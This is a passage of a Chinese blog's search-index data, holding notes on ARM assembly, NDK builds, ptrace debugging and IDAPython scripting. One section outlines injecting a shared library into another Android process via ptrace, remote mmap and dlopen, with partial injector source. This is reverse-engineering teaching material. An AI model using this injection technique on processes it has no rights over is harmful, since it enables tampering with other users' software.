[r3-4] [r3-8]处的内容,依次给r2 r1 r0 ldmdb r3, {r0-r2} @取内容之前减 将[r3-4] [r3-8] [r3-0xC]处的内容,依次给r2 r1 r0 存储指令: @存储 mov r3, sp stmia r3, {r0-r2} @取内容之后加 将r0 r1 r2 依次给[r3] [r3+4] [r3+8] stmib r3, {r0-r2} @取内容之前加 将r0 r1 r2 依次给[r3+4] [r3+8] [r3+0xC] stmda r3, {r0-r2} @取内容之后减 将r2 r1 r0 依次给[r3] [r3-4] [r3-8] stmdb r3, {r0-r2} @取内容之前减 将r2 r1 r0 依次给[r3-4] [r3-8] [r3-0xC] 入栈出栈: @full dec 满递减 堆栈向下增长 与x86相同 @入栈 stmfd sp!, {r0-r2} @等同于x86中的 push r0 push r1 push r2 sp加!(回写)后,sp会自动修改(每次先减4,再存) @出栈 ldmfd sp!, {r0-r2} @等同于x86中的 pop r2 pop r1 pop r0 sp加!(回写)后,sp会自动修改(每次先加4,再存) 寄存器和存储器交换 @寄存器和存储器交换 swp r0, r1, [sp] @将[sp]的值给r0 r1的值给[sp] swp r0, r0, [sp] @将[sp]的值给r0 r0原来的值给[sp] 达到了寄存器和存储器交换的目的 swpb r2, r3, [sp] @将[sp]中1字节的值给r2,高位补0 r3中1字节的值给[sp] ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:6","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"数据处理指令 指令编码 操作码表 操作码 指令助记符 说明 0000 AND 逻辑与操作指令 0001 EOR 逻辑异或操作指令 0010 SUB 减法运算指令 0011 RSB 逆向减法指令 0100 ADD 加法运算指令 0101 ADC 带进位加法 0110 SBC 带进位减法指令 0111 RSC 带进位逆向减法指令 1000 TST 位测试指令 1001 TEQ 相等测试指令 1010 CMP 比较指令 1011 CMN 负数比较指令 1100 ORR 逻辑或操作指令 1101 MOV 数据传送 1110 BIC 位清除指令 1111 MVN 数据非传送 数据传送指令 @数据传送指令 mov r0, #1 @将1给r0 mvn r1, #0 @将0取反后的结果给r1 movt r2, #123 @将123的值给r2的高16位 算术逻辑运算指令 @算术逻辑指令 adds r1, r2, r2 @r1 = r2 + r2 影响标志寄存器 进位 Carry = 1 adc r1, r2, #2 @r1 = r2 + 2 + Carry位的值 add r1, r2, r2 @r1 = r2 + r2 不影响标志寄存器 subs r0, r1, #9 @r0 = r1 - 9 影响标志寄存器 借位 Carry = 0 sbc r0, r1, #5 @r0 = r1 - 5 - (Carry位取反的值) sub r0, r1, #5 @r0 = r1 - 5 不影响标志寄存器 rsb r0, r1, #5 @r0 = 5 - r1 rsc r0, r1, #5 @r0 = 5 - r1 - (Carry位取反的值) 注意 加法进位 Carry位为1 减法借位 Carry位为0 逻辑指令 @逻辑指令 mov r0, #-1 and r0, #0x80000001 @r0 = r0 \u0026 0x80000001 清零 orr r0, #0x80000001 @r0 = r0 | 0x80000001 置位 eor r0, #0xff @r0 = r0 ^ 0x80000001 按位取反 bic r0, #0xff @r0 = r0 \u0026 (~0xff) 比较指令 @比较指令 cmp r0, #3 @r0 - 3 cmn r0, #3 @r0 - (-3) 负数比较 tst r0, #3 @r0 \u0026 3 tst r0, r0 @判r0是否为0 teq r0, r1 @r0 ^ r1 判r0与r1是否相等 乘法指令 @乘法指令 mul r2, r0, r1 @32位乘法 r2 = (r0 * r1)的结果只取低32位 mla r2, r0, r1, r3 @32位乘法 r2 = (r3 + (r0 * r1))的结果只取低32位 mls r2, r0, r1, r3 @32位乘法 r2 = (r3 - (r0 * r1))的结果只取低32位 umull r2, r0, r1, r3 @64位无符号 (r1 * r3)的结果,低32位放r2 高32位结果放r0 umlal r2, r0, r1, r3 @64位无符号 r2作为低32位 r0作为高32位组成64位 加上r1 * r3的结果,低32位放r2 高32位放r0 umaal r2, r0, r1, r3 @64位无符号 (r2 + r0 + r1 * r3)的结果,低32位放r2 高32位结果放r0 smull r2, r0, r1, r3 @64位有符号 (r1 * r3)的结果,低32位放r2 高32位结果放r0 smlal r2, r0, r1, r3 @64位有符号 r2作为低32位 r0作为高32位组成64位 加上r1 * r3的结果,低32位放r2 高32位放r0 smmul r2, r1, r3 @(r1 * r3)的结果,高32位放r2 smmla r2, r0, r1, r3 @r2 = (r3 + (r0 * r1)的高32位) smmls r2, r0, r1, r3 @r2 = (r3 - (r0 * r1)的高32位) 除法指令 没有特定的指令,需要依靠其他指令做优化来完成除法运算. 编译器已将做好了库,直接调用即可. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:7","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"跳转指令 条件码 b的后面可以跟条件码,如beq,bne. 指令编码 IDA静态分析,切换指令集 指令示例 B: push {r11, lr} mov r0, 1 mov r1, 2 mov lr, pc @使用b指令来调用函数,需要自己设置LR寄存器,十分不方便. b my_add pop {r11, pc} my_add: add r0, r0, r1 mov pc, lr BL: bl所在的指令集和所调函数的指令集相同. push {r11, lr} mov r0, 2 mov r1, 4 bl my_add @使用bl指令来调用函数,不需要自己设置LR寄存器 pop {r11, pc} my_add: add r0, r0, r1 mov pc, lr bl所在的指令集和所调函数的指令集不同. @bl 下面所示的调用会崩,没有切换指令集 push {r11, lr} .code 32 @arm指令集 mov r0, 2 mov r1, 4 bl my_add @使用bl指令来调函数,不需要自己设置LR寄存器,但是无法自动切换指令集,即标志寄存器的T位. pop {r11, pc} my_add: .code 16 @thumb指令集 add r0, r0, r1 mov pc, lr BX: @bx 后面跟的只能是寄存器 push {r11, lr} .code 32 @arm指令集. mov r0, 3 mov r1, 5 @ cpu计算偏移的时候,会忽略地址的低位. add r2, pc, #9 @1. 需要自己算偏移,状态的切换由地址的最低位来决定,0:arm指令,1:thumb指令 mov lr, pc @2. 需要自己设置LR寄存器. bx r2 @ 会根据地址的最低位,自动切换状态,即标志寄存器T位的值. pop {r11, pc} my_add: .code 16 @thumb指令集. add r0, r0, r1 @mov pc, lr bx lr @3. 状态切换,由地址低位来决定,0:arm指令,1:thumb指令. BLX: push {r11, lr} .code 32 mov r0, 1 mov r1, 2 blx my_add @会自动切状态,T位取反. pop {r11, pc} my_add: .code 16 @thumb指令集. add r0, r0, r1 @mov pc, lr bx lr @3. 状态切换,由地址低位来决定,0:arm指令,1:thumb指令. TBB: @tbb thumb2指令才可以用,常用来做SwitchCase push {r11, lr} blx thumb2 .code 16 thumb2: add r2, pc, #8 mov r3, #2 tbb [r2, r3] @PC = PC + (R2 + R3)内存地址处取一字节然后乘以2 table1: .byte 0 .byte 1 .byte 2 .byte 3 case1: mov r0, r1 pop {r11, pc} TBH: 表跳转半字 B:byte H:half PC = PC + ZeroExtend( Memory( Rn + Rm « 1, 2) « 1) ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:8","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"其他指令 中断指令 swi #中断号 svc #中断号 系统调用_exit: 看下系统底层是如何调_exit这个API的: 测试代码: mov r0, 0 bl _exit 操作: IDA调试,F7跟进_exit. 结论: Android系统调API的中断是0. _exit的api编号是0xF8. 喜讯: Android 0环Api调用的参数与3环参数相同. 目前Android所有版本API编号一样. 这与Windows有所不同,Windows不同版本,API编号也不一样. Android Ndk目录中有一个文件(unistd-common.h)记录了所有的API编号, ndk编程中不同指令集要包含不同路径下的unistd-common.h. Arm调用_exit示例: @调用_exit示例 mov r0, 0 mov r7, #0xF8 svc #0 NDK编程调用_exit示例: #include \u003csyscall.h\u003e //包含这个文件会根据指令集包含一个合适的头文件 #include \u003cunistd.h\u003e extern \"C\" JNIEXPORT void JNICALL Java_org_example_luondk_MainActivity_TstExit(JNIEnv *env, jobject thiz) { //查看unistd-common.h. 我们发现exit对应的api编号为 __NR_exit_group, 即0xF8,十进制的248 //可通过调用syscall 就不用我们手写汇编了 //调用的api,后面有几个参数,就传几个参数 syscall(__NR_exit_group, 0); } 标志寄存器: @读标志寄存器 mrs r0, cpsr @改标志寄存器,只能修改高8位,其他无权限 mov r0, 0xffffffff msr cpsr_cfsx, r0 msr cpsr_f, r0 伪指令 解决偏移问题: ADR: @add r0, pc, #8 @计算到code1的偏移. @上面那种写法的痛点在于 如果这条语句和code1之间新增了指令,就需要重新计算偏移. adr code1 @我们可以使用adr伪指令来代替上面的那条很不舒服的指令,编译器会帮我们计算偏移. mov r0, r1 mov r0, r1 mov r0, r1 code1: mov r0, #3 ADRL: adrl能计算的偏移更大,但是目前版本的编译器不能使用该伪指令. 解决给立即数问题: LDR: @伪指令 LDR ldr r0, =0xff1 @伪指令给立即数,后面要写= ldr r2, =0x55668899 NOP: 目前nop指令已不是伪指令了,在早期版本nop指令是伪指令. 早期nop伪指令对应的汇编语句为 mov r0, r0. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:9","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"浮点指令 寄存器: float: s0-s31 double: d0-d31 在常规指令前加V即可,如VADD,VSUB,VMOV. ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:10","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm指令参考 ARM-Thumb2指令集速查卡.pdf ARMv8-arm64指令集速览表.pdf ARM矢量浮点指令集参考手册.pdf ","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:11","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["Android基础"],"content":"Arm应用 内联汇编 LuoHello.cpp #include \u003cstdio.h\u003e int main(){ //单行 __asm__(\"mov r0, r1\"); //多行,每一行的后面要有换行符 __asm__( \"mov r2, r1\\n\" \"mov r1, r1\\n\" \"mov r3, r4\\n\" \"mov r1, r1\\n\" ); printf(\"Hello Arm\\n\"); return 0; } Arm_内联汇编.7z 裸函数 //裸函数 extern \"C\" __attribute__((naked)) int MySub(int n1, int n2){ __asm__( \"sub r0, r0, r1\\n\" \"bx lr\" ); } 混合编译 源文件: LuoArm.s .text .globl LuoAdd .globl LuoSub @.extern MySub .p2align 2 .type LuoAdd,%function .code 32 LuoSub: push {r11, lr} @汇编调C bl MySub pop {r11, lr} bx lr LuoAdd: push {r11, lr} add r0, r0, r1 pop {r11, lr} bx lr .p2align 2 LuoAdd_end: .size LuoAdd, LuoAdd_end-LuoAdd LuoHello.cpp #include \u003cstdio.h\u003e //裸函数 extern \"C\" __attribute__((naked)) int MySub(int n1, int n2){ __asm__( \"sub r0, r0, r1\\n\" \"bx lr\" ); } extern \"C\" int LuoAdd(int n1, int n2); extern \"C\" int LuoSub(int n1, int n2); int main(){ //C++调汇编 printf(\"LuoAdd: 2 + 3 = %d\\n\", LuoAdd(2, 3)); printf(\"MySub: 6 - 1 = %d\\n\", LuoSub(6, 1)); return 0; } Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) #存储要构建的模块的名称 LOCAL_MODULE := LuoHello #列举源文件 LOCAL_SRC_FILES := LuoHello.cpp LuoArm.s #链接选项 LOCAL_CPPFLAGS := -marm #包含编译脚本 include $(BUILD_EXECUTABLE) Application.mk APP_PLATFORM := android-16 APP_ABI := armeabi-v7a Arm_混合编译.7z 编译: 输入ndk-build进行编译. 运行: 确保Android虚拟机在开着. 调试 调试api: https://man7.org/linux/man-pages/man2/ptrace.2.html long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); //参数一:request的宏定义很多,可以参考上面的网址. //PTRACE_ATTACH 附加 //PTRACE_CONT 继续执行 //PTRACE_PEEKTEXT, PTRACE_PEEKDATA 读数据 //PTRACE_GETREGSET 获取寄存器信息 //PTRACE_SETREGSET 设置寄存器信息 调试示例: #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cunistd.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e int main() { printf(\"Main Start:%d\\n\", getpid()); fflush(stdout); int childPid = fork(); if (childPid == 0) { while (true) { sleep(1); printf(\"childPid: %d......\\n\", getpid()); fflush(stdout); } } else { //附加子进程 if (ptrace(PTRACE_ATTACH, childPid, 0, 0) \u003c 0) { perror(\"PTRACE_ATTACH\"); fflush(stdout); return 0; } //等调试事件 waitpid(childPid, NULL, WUNTRACED); printf(\"PTRACE_ATTACH OK\\n\"); fflush(stdout); //继续执行 if (ptrace(PTRACE_CONT, childPid, 0, 0) \u003c 0) { perror(\"PTRACE_CONT\"); fflush(stdout); return 0; } printf(\"PTRACE_CONT OK\\n\"); fflush(stdout); } //等待子进程结束 waitpid(childPid, NULL, WUNTRACED); printf(\"Main End:%d\\n\", getpid()); fflush(stdout); return 0; } Arm_LuoDebug.7z 注意 不是父子进程之间调试,就需要root权限. 代码注入 思路 在远程进程中申请一段地址空间,将要注入的动态库文件的路径写进去,然后在远程进程中调dlopen函数将动态库加载到内存中. 细节 ①如何在远程进程中申请地址空间? 我们知道在自身进程中,可以调用mmap函数来申请地址空间.我们可以附加远程进程,将pc寄存器的值设置为远程进程中mmap函数的地址(这个地方需要注意的就是pc寄存器值的低位不可能为1),然后运行程序,函数的返回值就是申请的地址空间. ②如何计算远程api函数的地址? 远程api函数地址 = 远程api函数所在模块基址 + (自身进程api函数地址 - 自身进程api函数所在的基址). ③如何知道api函数在哪个模块中? 我们可以在自身进程中打印api函数地址以及所有的内存模块地址,比对api函数地址在哪个内存模块地址范围内,即可知道api函数所在的模块. ④如何知道远程进程api函数执行完毕? 我们在执行远程进程api函数之前,将lr寄存器的值设置为0,这样远程进程api函数执行完毕,就会产生异常.我们可以调用waitpid这个函数来等待异常(这个函数在异常没来之前会阻塞),当执行到waitpid的下一行的时候,说明远程进程api函数已经执行完毕. 源代码 注入的目标程序: #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e int main() { while (true) { sleep(1); printf(\"Inject Target: %d\\n\", getpid()); fflush(stdout); } return 0; } 注入的动态库: #include \u003cstdio.h\u003e __attribute__((constructor)) void LuoLoad() { printf(\"Hello LuoLoad\\n\"); fflush(stdout); } 注入程序: 步骤: 附加目标进程. 保存寄存器环境. 修改寄存器环境. 在远程进程中申请地址空间. 将库路径写入申请的地址空间中. 将远程进程dlopen的地址给pc寄存器. 还原寄存器环境. 取消附加. #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/ptrace.h\u003e #include \u003candroid/log.h\u003e #include \u003cerrno.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/mman.h\u003e #include \u003cdlfcn.h\u003e #include \u003candroid/log.h\u003e #include \u003ccstring\u003e #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"Luo\", __VA_ARGS__); //显示寄存器的值 void show_regs(pt_regs *pRegs) { for (int i = 0; i \u003c 16; ++i) { if (i == 13) { printf(\"SP:%08X\\t\", pRegs[i]); } else if (i == 14) { printf(\"LR:%08X\\t\", pRegs[i]); } else if (i == 15) { printf(\"PC:%08X\\t\", pRegs[i]); } else { printf(\"R%d:%08X\\t\", i, pRegs[i]); } fflush(stdout); if (i == 7) { printf(\"\\n\"); fflush(stdout); } } printf(\"\\n\"); fflush(","date":"2021-08-29","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/:0:12","tags":["Android"],"title":"Arm指令","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/arm/"},{"categories":["IDA"],"content":"简介 IDAPython核心有如下3个Python模块: idc:负责提供idc中所有的函数功能. idautils:提供大量的实用函数,其中许多函数可生成各种数据库相关对象(如函数或交叉引用)的python列表. idaapi:允许使用者通过类的形式,访问更多底层的数据. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:1:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置调试环境 配置Python,安装必备的库 pip install tornado pip install debugpy 配置环境变量 修改PYTHONPATH环境变量.安装Python时,默认是不会自动进行配置的,所以如果没有的话要先新建一个. . XXX\\IDA_Pro\\python\\3 XXX\\IDA_Pro\\plugins VSCode,安装IDACode 配置IDACode,本机调试,默认即可 IDA, 安装IDACode插件 https://github.com/ioncodes/idacode/releases 修改idacode_utils/settings.py文件,将Python路径设置为IDA所用的Python路径 HOST = \"127.0.0.1\" PORT = 7065 DEBUG_PORT = 7066 PYTHON = \"XXX/IDA_Pro/python311/python.exe\" LOGGING = False 此时已经配置好调试环境了,打开IDA,查看输出窗口是否有如下提示,若有则说明成功! [IDACode] Plugin version 0.3.0 [IDACode] Plugin loaded, use Edit -\u003e Plugins -\u003e IDACode to start the server 使用示例: import idautils import idaapi import idc print(\"Hello IDAPython\") IDA启用IDACode插件 VSCode连接IDA 设置工作区: 将Python脚本所在文件夹添加到工作区 连接IDA: Ctrl + Shift + P, 调出命令窗口 调试的话,就选带debugger的. 出错情况应对: 此时VSCode可能会出现两种错误 解决方法如下: 重启IDA,保证VSCode有且只有一个工作区文件夹. 运行脚本 由于插件有保存后直接发送到IDA中运行的功能,所以按下Ctrl+S就能看到脚本被执行. 调试 由于我们并不是直接在VSCode环境中运行脚本,所以传统方式设置的断点是断不到的,应该采用如下的方式设置断点. import idautils import idaapi import idc print(\"Hello IDAPython\") n = 5 print(\"Befor breakpoint\") breakpoint() print(\"After breakpoint\") n = 10 注意 不要将breakpoint放到文件末尾,因为调试的时候,他会断在breakpoint的下条语句. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:2:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"配置Python代码自动补全 VSCode安装IntelliCode插件 修改VsCode配置文件,添加需要自动补全代码的Python文件所在路径 修改settings文件内容如下: \"python.autoComplete.extraPaths\": [ \"XXX/IDA_Pro/python/3\", \"XXX/IDA_Pro/python311/Lib/site-packages\", ], 接下来,在VSCode中书写IDAPython代码就会自动补全代码了. ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:3:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"基本操作 获取当前地址: idc.here() idc.get_screen_ea() 获取当前地址空间的最小地址和最大地址: idaapi.cvar.inf.min_ea idc.get_inf_attr(idc.INF_MIN_EA) idaapi.cvar.inf.max_ea idc.get_inf_attr(idc.INF_MAX_EA) 在ida的反汇编窗口中,下面的每一个信息都可以用函数获取到. .text:0043375E mov esi, [eax+0Ch] Python\u003e idc.get_segm_name(here()) '.text' Python\u003e idc.GetDisasm(here()) 'mov esi, [eax+0Ch]' Python\u003eidc.print_insn_mnem(here()) 'mov' Python\u003eidc.print_operand(here(),0) 'esi' Python\u003eidc.print_operand(here(),1) '[eax+0Ch]' ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:4:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"段操作 打印一行数据好像并没什么卵用,但是IDAPython的强大之处在于它能遍历所有的指令, 所有的交叉引用地址,还有搜索所有的代码和数据.后面两项功能稍后再做介绍,我们 先从遍历所有段的指令开始讲起. import idc import idautils import idaapi for seg in idautils.Segments(): print(idc.get_segm_name(seg),hex(idc.get_segm_start(seg)),hex(idc.get_segm_end(seg))) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:5:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"函数 遍历所有函数: import idc import idautils import idaapi for func in idautils.Functions(): print(hex(func),idc.get_func_name(func)) Functions()将返回一个保存着已知函数首地址的数组,同样此函数也可以用来查找在指定地址范围的函数列表. get_func_name(ea)用来获取函数名,ea这个参数可以是处于函数中的任何地址. idaapi.get_func_qty()获取此binary中识别的函数的个数. idaapi.getn_func(1)获取第1个函数的对象. 获取函数的边界信息: Python\u003eidaapi.get_func(here()) \u003cida_funcs.func_t; proxy of \u003cSwig Object of type 'func_t *' at 0x0000026DF330AE40\u003e \u003e Python\u003eidaapi.get_func(here()).start_ea 0x43371b Python\u003eidaapi.get_func(here()).end_ea 0x4337c4 同时也可以使用idc.get_next_func(ea)和idc.get_prev_func(ea)获取ea地址的后一个函数和前一个函数,ea 的值需要在被分析的函数地址之内.在枚举函数的时候,只有IDA将这段代码标记为函数的时候才行,不然会在枚举的过程中被跳过.没有被标记为函数的代码将在图例(ida顶部的彩色条)中标为红色.当然我们可以手工的修复这些无法被标记为函数的代码. 还可以使用如下两个api来获取函数的边界地址: Python\u003eidc.get_func_attr(here(), FUNCATTR_START) 0x43371b Python\u003eidc.get_func_attr(here(), FUNCATTR_END) 0x4337c4 get_func_attr的第二个参数有如下值: FUNCATTR_START = 0 # readonly: function start address FUNCATTR_END = 4 # readonly: function end address FUNCATTR_FLAGS = 8 # function flags FUNCATTR_FRAME = 16 # readonly: function frame id FUNCATTR_FRSIZE = 20 # readonly: size of local variables FUNCATTR_FRREGS = 24 # readonly: size of saved registers area FUNCATTR_ARGSIZE = 28 # readonly: number of bytes purged from the stack FUNCATTR_FPD = 32 # frame pointer delta FUNCATTR_COLOR = 36 # function color code FUNCATTR_OWNER = 16 # readonly: chunk owner (valid only for tail chunks) FUNCATTR_REFQTY = 20 # readonly: number of chunk parents (valid only for tail chunks) 利用函数名获取一个函数的地址: Python\u003eidc.get_name_ea_simple(\"sub_43371B\") 0x43371b 遍历函数的所有指令: import idc import idautils import idaapi start = idc.get_func_attr(idc.here(),idc.FUNCATTR_START) end = idc.get_func_attr(idc.here(), idc.FUNCATTR_END) curr_addr = start while curr_addr \u003c= end: print(hex(curr_addr),idc.GetDisasm(curr_addr)) curr_addr = idc.next_head(curr_addr,end) idc.next_head(curr_addr,end)返回处于curr_addr和end之间的下一条指令的地址,如果没有指令则返回idc.BADADDR.这种方法的一个缺陷是它依赖于指令被包含在函数开始和结束的边界内.打个比方说,函数内有个jmp指令,它跳转到比这个函数结束地址还要高的地址中去,意思是这个函数的所有指令可能并不是线性的,它可能会通过jmp跳出函数边界(起始地址和结束地址),但其实这段指令仍是属于这个函数的,那么我们使用上述的方法就不能够遍历到该函数要执行的所有指令.这种跳转在代码混淆中非常的常见,所以说我们最好还是使用idautils.FuncItems(ea)来循环函数内的指令. import idc import idautils import idaapi items = idautils.FuncItems(idc.here()) for item in items: print(hex(item),idc.GetDisasm(item)) 获取ea地址的上一条指令的地址: idc.prev_head(ea) 关于函数的详细信息有如下几个函数: #可在idc_bc695.py中查看 def GetFrame(ea): return get_func_attr(ea, FUNCATTR_FRAME) def GetFrameLvarSize(ea): return get_func_attr(ea, FUNCATTR_FRSIZE) def GetFrameRegsSize(ea): return get_func_attr(ea, FUNCATTR_FRREGS) def GetFrameArgsSize(ea): return get_func_attr(ea, FUNCATTR_ARGSIZE) def GetFunctionFlags(ea): return get_func_attr(ea, FUNCATTR_FLAGS) 例如用如下代码获取函数的标志: import idc import idautils import idaapi for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_NORET: print(hex(func), \"FUNC_NORET\") if flags \u0026 idc.FUNC_FAR: print(hex(func), \"FUNC_FAR\") if flags \u0026 idc.FUNC_LIB: print(hex(func), \"FUNC_LIB\") if flags \u0026 idc.FUNC_STATIC: print(hex(func), \"FUNC_STATIC\") if flags \u0026 idc.FUNC_FRAME: print(hex(func), \"FUNC_FRAME\") if flags \u0026 idc.FUNC_USERFAR: print(hex(func), \"FUNC_USERFAR\") if flags \u0026 idc.FUNC_HIDDEN: print(hex(func), \"FUNC_HIDDEN\") if flags \u0026 idc.FUNC_THUNK: print(hex(func), \"FUNC_THUNK\") if flags \u0026 idc.FUNC_LIB: print(hex(func), \"FUNC_BOTTOMBP\") 各种标志的含义如下: FUNC_NORET: 这个标志表示某个函数是否有返回值. FUNC_FAR: 这个标志非常少的出现,标志程序是否使用分段内存. FUNC_USERFAR: 这个标志也非常少见,也很少有文档,HexRays把它描述为“user has specified far-ness of the function”. FUNC_LIB: 这个表示用于寻找库函数的代码.识别库函数代码是非常有必要的,因为我们在分析的 时候一般将其跳过.下面的例子展示了如何使用这个标志. import idc import idautils for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB: print(hex(func), \"FUNC_LIB\",idc.get_func_name(func)) FUNC_STATIC: 这个标志作用在于识别该函数在编译的是否是一个静态函数.在C语言中静态函数被默认为是全局的.如果作者把这个函数定义为静态函数,那么这个函数只能被本文件中的函数访问.利用静态函数的判定我们可以更好的理解源代码的结构. FUNC_FRAME: 这个标志表示函数是否使用了ebp寄存器(帧指针),使用ebp寄存器的函数通常有如下的语法设定,目的是为了保存栈帧. .text:0","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:6:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"指令 如果我们拥有一个函数中的指令地址,我们可以使用idautils.FuncItems(ea)来获取该函数中所有指令地址的集合. import idc import idautils import idaapi items = idautils.FuncItems(idc.here()) for item in items: print(hex(item),idc.GetDisasm(item)) 获取ea这个地址所在函数的所有指令的地址: #返回一个迭代器 idautils.FuncItems(ea) 现在我们已经完全掌握了如何循环遍历程序中的段,函数和指令,那我们就开始展示一个非常有用的例子.有时候我们会逆向一段加壳的代码,这时知道代码中哪里进行了动态调用对分析是非常有帮助的.一个动态的调用可能是由 call 或者 jmp 加上一个操作数来实现的,比如说 call eax或者 jmp edi. import idc import idautils import idaapi for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = idautils.FuncItems(func) for line in dism_addr: m = idc.print_insn_mnem(line) if m == \"call\" or m == \"jmp\": op = idc.get_operand_type(line,0) if op == idc.o_reg: print(hex(line),idc.GetDisasm(line)) 获取操作数类型: #n=0表示第一个操作数,n=1表示第二个操作数. get_operand_type(ea,n) 获取当前指令的下一个指令的地址和上一个指令的地址: #这两个函数的功能获取的是下一条指令的地址而不是下一个地址 idc.next_head(idc.here()) idc.prev_head(idc.here()) 获取下一个地址或者上一个: idc.next_addr(idc.here()) idc.prev_addr(idc.here()) 区别如下: .text:005772A9 add esi, 4 .text:005772AC cmp esi, offset unk_5D53BC Python\u003eidc.next_head(0x005772A9) 0x5772ac Python\u003eidc.next_addr(0x005772A9) 0x5772aa ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:7:0","tags":["IDA"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"操作数 操作数在逆向分析中经常被使用,所以说了解所有的操作数类型对逆向分析是非常有帮助的.在前面文中提到我们可以使用idc.get_operand_type(ea,n)来获取操作数类型,ea 是一个地址,n 是一个索引.操作数总共有八种不同的类型. o_void: 如果指令没有任何操作数,它将返回 0. o_reg: 如果操作数是寄存器,则返回这种类型,它的值为 1. o_mem: 如果操作数是直接寻址的内存,那么返回这种类型,它的值是 2,这种类型对寻找DATA的引用非常有帮助. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x40f576 cmp dword_5D0E44, edi Python\u003eidc.GetOpType(idc.here(),0) 0x2 o_phrase: 如果操作数是利用基址寄存器和变址寄存器的寻址操作的话,那么返回该类型,值为3. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x1000b8c2 mov [edi+ecx], eax Python\u003eidc.GetOpType(idc.here(),0) 0x3 o_displ: 如果操作数是利用寄存器和位移的寻址操作的话,返回该类型,值为4,位移指的是像如下代码中的 0x18,这在获取结构体中的某个数据是非常常见的. Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0x40f6ec mov ebx, [ebp+0Ch] Python\u003eidc.GetOpType(idc.here(),1) 0x4 o_imm: 如果操作数是一个确定的数值的话,那么返回类型,值为5. ------------------------------------------- Python\u003eprint(hex(idc.here()), idc.GetDisasm(idc.here())) 0xa05da1 add esp, 0Ch Python\u003eidc.GetOpType(idc.here(),1) 0x5 ------------------------------------------- o_far: 这种返回类型在x86 和 x86_64的逆向中不常见.它用来判断直接访问远端地址的操作数,值为6. o_near: 这种返回类型在x86和x86_64的逆向中不常见.它用来判断直接访问近端地址的操作数,值为7. 例1 当我们在逆向一个可执行文件的时候,我们可能会注意到一些代码会不断的重复使用某个偏移量.这种操作感觉上是代码在传递某个结构体给不同的函数使用.接下来的这个例子的目的是创建一个python的字典,字典包含了可执行文件中使用的所有偏移量,让偏移量作为字典的key,而每个key对应的value存储着所有使用该偏移量的地址. import idc import idautils import idaapi from collections import defaultdict displace = defaultdict(list) for func in idautils.Functions(): flags = idc.get_func_attr(func, idc.FUNCATTR_FLAGS) if flags \u0026 idc.FUNC_LIB or flags \u0026 idc.FUNC_THUNK: continue dism_addr = idautils.FuncItems(func) for line in dism_addr: op = None index = None # 定义结果结构来解析当前的指令 tmp 